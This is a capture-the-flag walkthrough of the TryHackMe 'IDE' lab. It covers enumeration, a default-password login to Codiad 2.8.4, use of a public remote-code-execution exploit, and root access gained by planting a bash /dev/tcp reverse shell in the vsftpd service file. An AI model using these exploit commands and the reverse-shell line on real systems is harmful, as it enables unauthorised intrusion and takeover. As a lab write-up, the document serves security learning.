# [IDE](https://tryhackme.com/room/ide)

First as usual, nmap

```
# Nmap 7.92 scan initiated Sat Nov 27 11:07:55 2021 as: nmap -vvv -p 22,21,80,62337 -sCV -oA init 10.10.83.179
Nmap scan report for 10.10.83.179
Host is up, received syn-ack (0.20s latency).
Scanned at 2021-11-27 11:08:03 +07 for 22s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.21.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Codiad 2.8.4
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 27 11:08:25 2021 -- 1 IP address (1 host up) scanned in 30.06 seconds
```

We have anonymous FTP. Logging in, we can go into the directory `...` and `get` the file `-` which holds the following content.

```
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

We have 2 usernames, `john` and `drac`, and we know there's a default password used somewhere.

The website on port 80 is just the default Apache2 page, nothing special. The page on port 62337 though, is a login page. We can login with the credentials `john:password`. After logging in, we get an online IDE called "Codiad 2.8.4" which we can see in the page title. Looking up exploits for codiad, we get a few results.

```sh
$ searchsploit codiad
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                              | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                  | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                 | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                             | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                             | multiple/webapps/49907.py
------------------------------------------------------------------------------------- ---------------------------------
```

I used `multiple/webapps/49705.py` to get a shell on the machine.

```sh
./49705.py http://10.10.83.179:62337/ john password YOUR_IP 1337 linux
```

With that, we should have a shell as `www-data`. We can go into `/home/drac` and read some files, of which `.bash_history` holds credentials for drac which we can use to `su drac`.

Checking our `sudo` privileges ...

```sh
drac@ide:~$ sudo -l
[sudo] password for drac:
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

We can restart the `vsftpd` service. To abuse this, we can edit the file `/lib/systemd/system/vsftpd.service` and change `ExecStart` to be a reverse shell.

```
ExecStart=/bin/bash -c 'exec bash -i &>/dev/tcp/YOUR_IP/1337 <&1'
```

Then we just set up a listener and run a couple of commands.

```sh
$ sudo systemctl daemon-reload
$ sudo /usr/sbin/service vsftpd restart
```

With that, we should have a shell as root.
